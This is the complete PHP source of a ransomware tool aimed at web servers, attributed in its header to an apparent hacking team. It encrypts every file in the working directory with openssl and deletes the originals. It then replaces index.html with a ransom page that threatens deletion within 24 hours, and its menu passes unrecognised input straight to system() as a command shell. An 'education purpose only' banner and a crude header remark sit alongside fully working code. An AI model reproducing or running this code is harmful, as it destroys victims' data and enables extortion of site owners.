<?php
/*
    Ransomware With AES-256 Encryption.
    @Author : Cy#b3r00T
    @About  : Your Mom Gay
    @Date   : 08 Dec 2018
    Copyright (c) 2018 Sora Cyber Team
*/
error_reporting(0);
function encrypt($password,$email){
$date=date("d/m/Y");
$scan=scandir(getcwd());
foreach($scan as $files){
    if($files=="." | $files==".."){
}elseif(!is_file($files)){
}else{
$thix=basename($_SERVER['PHP_SELF']);
if(preg_match("/$thix/",$files)){}else{
    system("openssl aes-256-cbc -in $files -out $files.enc -k $password");
    if(@unlink($files)){
    echo "$files --> Encrypted\n";
    $x=fopen("index.html",w);
    fwrite($x,"<title>Hacked?</title><center><pre><h1>Your Website Has Been Encrypted</h1><h2>All of your files has been locked.
    And will deleted on 24 hours from now [$date]
    
    Need Help?
    $email");
    fclose($x);
    }else{echo "$files --> Failed :(";}
}
}
}
}
function decrypt($passwd){
$scanz=scandir(getcwd());
echo "Decrypting ...\n";
sleep(3);
foreach($scanz as $filesz){
if(preg_match("/enc/",$filesz)){
system("openssl aes-256-cbc -d -in $filesz -out $filesz.dec -k $passwd");
unlink($filesz);
echo "Done";
}
}
}
function password(){
echo "Your Email : ";
$mail=trim(fgets(STDIN));
echo "Enter AES-256-cbc Password : ";
system('stty -echo');
$passwd=trim(fgets(STDIN));
system('stty echo');
sleep(1);
echo "\nEncrypting ...\n";
sleep(3);
encrypt($passwd,$mail);
exit;
}
function main(){
echo " -----------------
| Ransomware With | http://github.com/soracyberteam 
|   AES-256 Enc   | Warning! just for education purpose only!
 -----------------\n";
}menu:
main();
echo "[1] Encrypt\n[2] Decrypt\n[3] Exit\nroot@localhost:~# ";
$fu=trim(fgets(STDIN));
if($fu == "1"){
password();
}elseif($fu == "2"){
echo "Enter AES-256 Password : ";
$passwd=trim(fgets(STDIN));
decrypt($passwd);
}elseif($fu == "3"){
exit;
}else{
system($fu);
goto menu;
}
?>
